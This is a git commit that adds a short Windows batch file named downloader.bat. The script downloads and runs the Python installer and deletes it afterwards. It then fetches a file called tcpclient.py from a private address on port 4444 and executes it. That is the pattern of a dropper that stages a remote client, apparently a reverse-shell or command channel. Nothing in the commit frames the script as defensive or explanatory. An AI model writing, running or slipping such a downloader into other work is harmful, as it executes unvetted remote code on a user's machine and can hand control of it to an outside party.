fbc271f14f7a3c2b2bd6ade2fcab96a6ca03d83e
Zarni1322 <47309974+Zarni1322@users.noreply.github.com>
2023-05-09 12:56:19 +0630

    downloader.bat

--- downloader.bat
+++ downloader.bat
@@ -1,1 +1,12 @@
+echo off
+
+curl -O https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe
+
+python-3.11.3-amd64.exe
+
+del python-3.11.3-amd64.exe
+
+curl -O http://10.10.10.1:4444/tcpclient.py
+
+python tcpclient.py
 
